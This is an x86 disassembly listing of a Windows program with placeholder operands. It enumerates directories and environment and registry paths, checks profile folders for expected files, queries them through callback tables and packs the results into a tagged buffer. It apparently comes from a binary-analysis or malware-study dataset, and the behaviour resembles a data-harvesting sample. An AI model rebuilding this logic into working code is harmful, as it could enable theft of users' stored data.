mov ebp esp
and esp 0xfffffff8
sub esp 0x660
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x10 ] ax
lea eax [ esp + 0x12 ]
push eax
call sub_405830
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0xc ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0xc ]
push eax
call esi
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
lea eax [ esp + 0x8 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ esp + 0x8 ]
test eax eax
je r-xdata
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_41157b
je r-xdata
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call edi
push r--data
lea eax [ esp + 0x464 ]
push eax
call esi
lea eax [ esp + 0x210 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov esi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x210 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x210 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x214 ]
push eax
lea eax [ esp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_41157b
add esp 0x10
test al al
je r-xdata
sub_411757
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x464
push ebx
push esi
push edi
mov edi rw-data
mov eax edi
call sub_40c0aa
test al al
je r-xdata
mov edi [ ebp + 0x8 ]
call sub_412ae3
mov [ esp + 0x10 ] r--data
cmp eax 0x3
jl r-xdata
mov eax rw-data
mov ecx edi
call sub_40c1af
call sub_40bea8
mov esi [ GetEnvironmentVariableW@IAT ]
xor eax eax
inc eax
push eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x18 ]
call esi
mov edi eax
test edi edi
jne r-xdata
mov [ esp + 0x10 ] r--data
lea eax [ edi + edi + 0x2 ]
call sub_412da8
mov ebx eax
test ebx ebx
je r-xdata
xor al al
jmp r-xdata
inc edi
push edi
push ebx
push [ esp + 0x18 ]
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebx + eax * 2 - 0x2 ]
jmp r-xdata
push ebx
call sub_412d05
jmp r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
sub ecx 0x2
dec eax
je r-xdata
xor ecx ecx
push ebx
mov [ ebx + eax * 2 - 0x2 ] cx
call [ lstrlenW@IAT ]
xor eax eax
cmp eax sub_411616
je r-xdata
push ebx
call sub_412d05
mov edi rw-data
mov eax edi
call sub_40c0aa
test al al
je r-xdata
push ebx
lea eax [ esp + 0x26c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x26c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x26c ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov al 0x1
mov edx rw-data
mov ecx edi
call sub_40c257
call sub_40bea8
mov esi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x48 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x18 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x18 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x48 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x1c ]
push eax
push ebx
push [ ebp + 0x8 ]
call sub_411616
add esp 0x10
test al al
je r-xdata
sub_4118ea
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi [ eax ]
push 0xc
pop ecx
lea eax [ ebp - 0x1c ]
xor ebx ebx
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push 0xc
pop ecx
lea eax [ ebp - 0x10 ]
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push r--data
push edi
call [ lstrcpyW@IAT ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
call [ esi + 0x18 ]
add esp 0x10
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ esi + 0x14 ]
add esp 0xc
test eax eax
je r-xdata
xor al al
cmp [ ebp - 0x8 ] 0x800
jb r-xdata
lea eax [ ebp - 0x1c ]
push ebx
push eax
call [ esi + 0x1c ]
pop ecx
pop ecx
jmp r-xdata
push 0x7ff
push edi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push ebx
push 0xfde9
call [ MultiByteToWideChar@IAT ]
xor ecx ecx
mov [ edi + eax * 2 ] cx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov [ ebp - 0x1 ] bl
lea eax [ ebp - 0x1c ]
push ebx
push eax
call [ esi + 0x1c ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call [ esi + 0x1c ]
mov al [ ebp - 0x1 ]
add esp 0x10
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_4119a3
push ebp
mov ebp esp
mov eax 0x28ac
call sub_406c70
push ebx
push edi
push [ ebp + 0x8 ]
call [ SetCurrentDirectoryW@IAT ]
push [ ebp + 0x8 ]
mov edi [ lstrcpyW@IAT ]
lea eax [ ebp - 0x145c ]
push eax
call edi
push r--data
lea eax [ ebp - 0x145c ]
push eax
call [ PathAppendW@IAT ]
mov ecx [ esi + 0x30 ]
push r--data
lea ebx [ ebp - 0x145c ]
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x4 ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x8 ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0xc ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x10 ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x14 ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x18 ] eax
call sub_412df3
xor ecx ecx
mov [ esi + 0x1c ] eax
cmp [ esi ] ecx
je r-xdata
xor al al
cmp [ esi + 0x4 ] ecx
je r-xdata
cmp [ esi + 0x8 ] ecx
je r-xdata
cmp [ esi + 0xc ] ecx
je r-xdata
cmp [ esi + 0x10 ] ecx
je r-xdata
cmp [ esi + 0x14 ] ecx
je r-xdata
cmp [ esi + 0x18 ] ecx
je r-xdata
cmp eax ecx
je r-xdata
mov [ ebp - 0xc ] r--data
mov [ ebp - 0x8 ] r--data
mov [ ebp - 0x4 ] ecx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x2
jb r-xdata
cmp [ esi + 0x24 ] ecx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28ac ]
push eax
call edi
mov eax [ ebp - 0x4 ]
push [ ebp + eax * 4 - 0xc ]
lea eax [ ebp - 0x28ac ]
push eax
call [ PathAppendW@IAT ]
mov ecx [ esi + 0x30 ]
push r--data
lea ebx [ ebp - 0x28ac ]
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x20 ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x24 ] eax
call sub_412df3
mov ecx [ esi + 0x30 ]
push r--data
mov [ esi + 0x28 ] eax
call sub_412df3
xor ecx ecx
mov [ esi + 0x2c ] eax
cmp [ esi + 0x20 ] ecx
je r-xdata
cmp [ esi + 0x28 ] ecx
je r-xdata
cmp eax ecx
jne r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_411b51
push ebp
mov ebp esp
mov eax 0x1454
call sub_406c70
push ebx
push esi
push edi
push r--data
lea eax [ ebp - 0x1454 ]
push eax
mov esi ecx
call [ lstrcpyW@IAT ]
xor ecx ecx
mov eax r--data
mov ebx 0x80000002
cmp ecx eax
je r-xdata
push r--data
lea eax [ ebp - 0x1454 ]
push eax
call [ lstrcpyW@IAT ]
xor ecx ecx
mov eax r--data
cmp ecx eax
je r-xdata
lea ecx [ ebp - 0x1454 ]
push ecx
push r--data
push eax
push ebx
lea edi [ ebp - 0x4 ]
call sub_40c4dc
test al al
je r-xdata
xor al al
lea ecx [ ebp - 0x1454 ]
push ecx
push r--data
push eax
push ebx
lea edi [ ebp - 0x4 ]
call sub_40c4dc
test al al
je r-xdata
lea eax [ ebp - 0x1454 ]
push eax
call sub_4119a3
test al al
je r-xdata
lea eax [ ebp - 0x1454 ]
push eax
call sub_4119a3
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_411c01
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ae10
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x301c
call sub_406c70
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push ebx
mov [ esp + 0x1c ] eax
push esi
xor eax eax
cmp [ ebp + 0xc ] 0x6
push edi
jl r-xdata
mov ecx [ esp + 0x302c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov esi 0xffe
push esi
mov [ esp + 0x2c ] ax
xor ebx ebx
lea eax [ esp + 0x2e ]
push ebx
push eax
call sub_405830
xor eax eax
push esi
mov [ esp + 0x1038 ] ax
lea eax [ esp + 0x103a ]
push ebx
push eax
call sub_405830
xor eax eax
push esi
mov [ esp + 0x2044 ] ax
lea eax [ esp + 0x2046 ]
push ebx
push eax
call sub_405830
mov esi [ ebp + 0x10 ]
add esp 0x24
push 0x7ff
lea eax [ esp + 0x2c ]
push eax
push [ esi + 0x4 ]
call [ lstrlenA@IAT ]
push eax
push [ esi + 0x4 ]
push ebx
push 0xfde9
call [ MultiByteToWideChar@IAT ]
push [ esi + 0x10 ]
xor ecx ecx
mov [ esp + eax * 2 + 0x2c ] cx
mov eax [ ebp + 0x8 ]
lea edi [ esp + 0x102c ]
call sub_4118ea
pop ecx
test al al
je r-xdata
xor eax eax
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
lea edi [ esp + 0x202c ]
call sub_4118ea
pop ecx
test al al
je r-xdata
lea esi [ esp + 0x14 ]
call sub_40c9fb
mov [ esp + 0x3034 ] ebx
lea eax [ esp + 0x10 ]
push eax
push 0x4
pop edi
mov eax esi
mov [ esp + 0x14 ] 0x77010101
call sub_40cb2c
push r--data
mov eax esi
push eax
call sub_40ccf8
lea eax [ esp + 0x28 ]
push eax
mov eax esi
push eax
call sub_40ccf8
mov esi r--data
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x1028 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x2028 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_40cb2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_40cb2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40cce2
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x3
call sub_40cb2c
push [ 0x4 ]
lea eax [ esp + 0x18 ]
push eax
call sub_40cce2
mov edi [ 0x4 ]
cmp edi ebx
jle r-xdata
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
push eax
call sub_40cccc
push [ esp + 0x18 ]
push ebx
push 0x64
call sub_40ed22
mov esi [ esp + 0x30 ]
push eax
push ebx
push 0xff0f8211
push [ esp + 0x30 ]
push [ esp + 0x30 ]
call sub_40ffc9
test al al
je r-xdata
push [ 0x0 ]
lea eax [ esp + 0x18 ]
call sub_40cb2c
or [ esp + 0x3034 ] 0xffffffff
lea esi [ esp + 0x14 ]
call sub_40c938
jmp r-xdata
or [ esp + 0x3034 ] 0xffffffff
lea esi [ esp + 0x14 ]
call sub_40c938
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x1
sub_411e6e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
call [ esi + 0x8 ]
mov ebx eax
test ebx ebx
je r-xdata
call [ esi + 0x4 ]
mov al 0x1
pop ebx
leave
retn
push 0x0
push 0x1
push ebx
call [ esi + 0x10 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
call [ esi + 0x20 ]
add esp 0x14
test eax eax
jne r-xdata
push ebx
call [ esi + 0xc ]
pop ecx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push sub_411c01
push r--data
push [ ebp - 0x8 ]
call [ esi + 0x28 ]
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call [ esi + 0x24 ]
pop ecx
push [ ebp - 0x4 ]
call [ esi + 0x2c ]
pop ecx
sub_411edb
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x2af4
call sub_406c70
push ebx
push esi
push edi
xor eax eax
mov esi 0x144e
push esi
push eax
mov [ esp + 0x268 ] ax
lea eax [ esp + 0x26a ]
push eax
call sub_405830
add esp 0xc
xor eax eax
push esi
push eax
mov [ esp + 0x16b8 ] ax
lea eax [ esp + 0x16ba ]
push eax
call sub_405830
mov edi [ ebp + 0x14 ]
mov eax [ edi + 0x4 ]
mov esi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x264 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
mov ebx [ PathAppendW@IAT ]
add eax 0x2c
push eax
lea eax [ esp + 0x264 ]
push eax
call ebx
lea eax [ esp + 0x260 ]
push eax
lea eax [ esp + 0x16b4 ]
push eax
call esi
push r--data
lea eax [ esp + 0x16b4 ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x16b4 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x260 ]
push eax
lea eax [ esp + 0x14 ]
call sub_401432
mov esi [ esp + 0x10 ]
pop ecx
mov ebx eax
call sub_4014d5
test al al
je r-xdata
mov esi [ edi ]
lea eax [ esp + 0x260 ]
push eax
mov [ edi + 0xc ] 0x0
call [ SetCurrentDirectoryW@IAT ]
push r--data
call [ esi ]
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
push edi
call sub_411e6e
pop ecx
mov eax [ esp + 0xc ]
call sub_410115
sub_411ff8
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x18b4
call sub_406c70
push ebx
push esi
push edi
xor eax eax
push 0x144e
push eax
mov [ esp + 0x478 ] ax
lea eax [ esp + 0x47a ]
push eax
call sub_405830
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0x474 ]
push eax
call edi
mov eax [ ebp + 0x10 ]
mov esi [ PathAppendW@IAT ]
add eax 0x2c
push eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x474 ]
push eax
call esi
push r--data
lea eax [ esp + 0x474 ]
push eax
call esi
mov ebx [ lstrlenW@IAT ]
lea eax [ esp + 0x470 ]
push eax
call ebx
lea eax [ esp + 0x470 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
lea eax [ esp + 0x474 ]
push eax
call edi
push [ esp + 0x14 ]
lea eax [ esp + 0x474 ]
push eax
call esi
push r--data
lea eax [ esp + 0x474 ]
push eax
call esi
lea eax [ esp + 0x470 ]
push eax
call ebx
lea eax [ esp + 0x470 ]
test eax eax
je r-xdata
xor eax eax
cmp eax sub_411edb
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_411edb
je r-xdata
lea eax [ esp + 0x470 ]
push eax
lea eax [ esp + 0x26c ]
push eax
call edi
push r--data
lea eax [ esp + 0x26c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x26c ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x470 ]
push eax
lea eax [ esp + 0x26c ]
push eax
call edi
push r--data
lea eax [ esp + 0x26c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x26c ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test [ esp + 0x18 ] 0x10
je r-xdata
test [ esp + 0x18 ] 0x10
je r-xdata
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x48 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push 0x0
call [ Sleep@IAT ]
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x48 ]
push eax
call esi
test eax eax
je r-xdata
push [ esp + 0x10 ]
call [ FindClose@IAT ]
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x14 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x48 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x18 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x48 ]
push eax
call esi
test eax eax
je r-xdata
push [ ebp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x478 ]
push eax
push [ ebp + 0x8 ]
call sub_411edb
add esp 0x10
test al al
je r-xdata
push [ ebp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x478 ]
push eax
push [ ebp + 0x8 ]
call sub_411edb
add esp 0x10
test al al
je r-xdata
sub_41224b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41aff1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1b60
call sub_406c70
push esi
push edi
xor eax eax
push 0x144e
push eax
mov [ esp + 0x720 ] ax
lea eax [ esp + 0x722 ]
push eax
call sub_405830
add esp 0xc
push 0x80beaa2a
call sub_40f29b
push eax
mov eax 0x80156501
lea ecx [ esp + 0x2b8 ]
call sub_40c11a
and [ esp + 0x1b74 ] 0x0
lea esi [ esp + 0xc ]
call sub_40c9fb
mov [ esp + 0x1b74 ] 0x1
mov esi [ ebp + 0x8 ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x5c ] esi
call sub_411b51
lea eax [ esp + 0x2c ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0xc ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x2b0 ]
mov [ esp + 0x24 ] esi
call sub_40c0aa
test al al
je r-xdata
mov [ esp + 0x1b74 ] 0x0
lea esi [ esp + 0xc ]
call sub_40c938
or [ esp + 0x1b74 ] 0xffffffff
lea eax [ esp + 0x2b0 ]
call sub_40bed6
mov ecx [ esp + 0x1b6c ]
pop edi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop esi
mov esp ebp
pop ebp
retn
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x2b0 ]
call sub_40c1af
lea edi [ esp + 0x718 ]
call sub_4014fd
test al al
je r-xdata
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x2b0 ]
call sub_40c257
lea edi [ esp + 0x2b0 ]
call sub_40bea8
mov eax edi
push eax
call [ lstrlenW@IAT ]
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_411ff8
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x514 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x514 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x60 ]
push eax
lea eax [ esp + 0x514 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
mov edi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x90 ]
push eax
call edi
test eax eax
je r-xdata
test [ esp + 0x60 ] 0x10
je r-xdata
push [ esp + 0x8 ]
call [ FindClose@IAT ]
lea eax [ esp + 0x60 ]
push eax
push [ esp + 0xc ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x90 ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x64 ]
push eax
lea eax [ esp + 0x720 ]
push eax
push esi
call sub_411ff8
add esp 0x10
test al al
je r-xdata
sub_412463
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov esi [ eax ]
mov eax [ ecx + 0x8 ]
push 0xd
xor edx edx
pop ebx
div ebx
xor edi edi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ecx + 0x4 ]
mov edx edi
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov bl [ ebp + 0xc ]
cmp bl [ ecx + 0x4 ]
jne r-xdata
inc edi
add ecx 0xd
cmp edi eax
jl r-xdata
inc edx
cmp [ ebp + 0x10 ] edx
je r-xdata
cmp esi [ ecx ]
jne r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_4124c3
push ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
xor edx edx
push 0xd
pop ecx
div ecx
xor edx edx
mov esi eax
lea eax [ esi - 0x1 ]
mov [ ebp - 0x14 ] esi
test eax eax
jle r-xdata
pop edi
mov al 0x1
pop esi
leave
retn 0x4
push ebx
mov edx [ ebp - 0x8 ]
inc edx
lea eax [ esi - 0x1 ]
cmp edx eax
jl r-xdata
mov eax edx
imul eax eax 0xd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] ecx
mov ecx edx
imul ecx ecx 0xd
add ecx [ edi ]
mov [ ebp - 0x8 ] edx
inc edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] edx
cmp edx esi
jge r-xdata
pop ebx
mov edx [ ebp - 0x10 ]
add [ ebp - 0xc ] 0xd
inc edx
mov [ ebp - 0x10 ] edx
cmp edx esi
jl r-xdata
mov al [ ebx + 0x4 ]
cmp al [ ecx + 0x4 ]
jne r-xdata
mov ebx [ edi ]
add ebx [ ebp - 0xc ]
mov eax [ ebx ]
cmp eax [ ecx ]
jne r-xdata
inc [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xd
cmp edx [ ebp - 0x8 ]
je r-xdata
mov esi [ ebp - 0x4 ]
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xd
movsd [ edi ] [ esi ]
push ebx
push [ ebp - 0x4 ]
movsb [ edi ] [ esi ]
call sub_401f50
mov eax [ ebp - 0x28 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1f ]
mov [ ebx + 0x9 ] eax
mov eax [ ebp - 0x23 ]
mov [ ebx + 0x5 ] eax
mov al [ ebp - 0x24 ]
add esp 0xc
mov [ ebx + 0x4 ] al
sub_412589
push 0x1
push 0x6
push [ esp + 0xc ]
mov ecx esi
mov [ edi ] esi
call sub_412463
test eax eax
jne r-xdata
mov eax [ eax + 0x9 ]
add eax [ esi + 0x14 ]
mov [ edi ] eax
mov al 0x1
xor al al
jmp r-xdata
retn 0x4
sub_4125af
or [ esi ] 0xffffffff
push 0x1
push 0x1
push [ esp + 0xc ]
call sub_412463
test eax eax
jne r-xdata
cmp [ eax + 0x5 ] 0x4
je r-xdata
xor al al
jmp r-xdata
mov eax [ eax + 0x9 ]
mov [ esi ] eax
mov al 0x1
and [ esi ] 0x0
jmp r-xdata
retn 0x4
sub_4125f1
mov eax sub_41aa90
call sub_416a8c
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
call sub_4125dc
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x14 ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x4 ]
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_412634
mov eax sub_41aab0
call sub_416a8c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x4 ]
call sub_40c9fb
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x14 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
call sub_4125dc
push r--data
push edi
call [ lstrcpyW@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_412682
push ecx
push esi
push edi
mov esi eax
mov edi ecx
call sub_40c90c
push [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push 0x8
push eax
mov ecx edi
call sub_412463
test eax eax
jne r-xdata
mov ecx [ eax + 0x9 ]
add ecx [ edi + 0x14 ]
mov edi [ eax + 0x5 ]
push ecx
mov eax esi
call sub_40cb2c
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ecx
retn 0x8
sub_4126c1
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi eax
mov edi ecx
mov [ ebp - 0x4 ] 0x5a72b99
call sub_40c90c
push 0x1
push 0x7
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
call sub_412463
test eax eax
jne r-xdata
mov ecx [ eax + 0x9 ]
add ecx [ edi + 0x14 ]
mov edi [ eax + 0x5 ]
push ecx
mov eax esi
call sub_40cb2c
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
leave
retn
sub_412706
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ eax + 0x4 ]
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
test ecx ecx
je r-xdata
mov al 0x1
mov edi [ eax ]
mov eax [ edi ]
mov [ ebp - 0x18 ] edi
cmp eax ecx
jle r-xdata
mov ebx [ ebp + 0x8 ]
add eax 0xfffffff8
add edi 0x8
lea esi [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] esi
call sub_40c90c
lea esi [ ebx + 0x14 ]
call sub_40c90c
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x0
jle r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x10 ]
call sub_4124c3
mov ecx [ ebp - 0x8 ]
mov esi [ ecx ]
cmp esi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
push 0xd
sub eax esi
pop edx
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x1c ]
cmp esi [ eax ]
ja r-xdata
mov edi [ ebp - 0x8 ]
push 0xfffffffc
pop eax
sub eax [ ebp - 0x14 ]
add edi 0x4
add [ ebp - 0x4 ] eax
inc [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edi
cmp ecx [ eax + 0x4 ]
jl r-xdata
add esi edi
mov al [ esi + 0x4 ]
mov [ ebp - 0x14 ] edx
cmp al 0x1
jbe r-xdata
mov eax [ ebp - 0x10 ]
push esi
mov edi edx
call sub_40cb2c
cmp al 0x4
jbe r-xdata
push r--data
push 0x2
pop edi
lea eax [ ebx + 0x14 ]
call sub_40cb2c
mov edi [ esi + 0x5 ]
mov ecx [ ecx ]
lea eax [ edi + 0xd ]
add ecx eax
mov [ ebp - 0x14 ] eax
cmp ecx [ ebp - 0x4 ]
ja r-xdata
cmp al 0x5
je r-xdata
cmp [ esi + 0x4 ] 0x6
jne r-xdata
mov ebx [ ebx + 0x18 ]
lea eax [ esi + 0xd ]
push eax
mov eax [ ebp + 0x8 ]
